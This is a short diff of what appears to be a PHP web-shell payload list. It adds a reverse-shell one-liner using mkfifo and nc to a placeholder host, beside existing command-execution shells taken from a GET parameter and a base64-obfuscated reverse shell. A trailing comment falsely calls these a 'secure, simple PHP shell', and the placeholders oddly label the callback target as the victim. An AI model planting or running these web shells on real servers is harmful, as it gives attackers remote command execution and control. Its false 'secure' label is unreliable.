@@ -3,6 +3,7 @@
 
 <?php system($_GET["cmd"]); ?>
 <?php echo shell_exec($_GET["cmd"]); ?>
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <victim_ip> 3333 >/tmp/f');?>
 <?php exec(base64_decode('cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTxhdHRhY2tlcl9pcD4gPGF0dGFja2VyX3BvcnQ+ID4vdG1wL2Y=')); ?>
 
 //Secure, simple PHP shell to load and execute code;
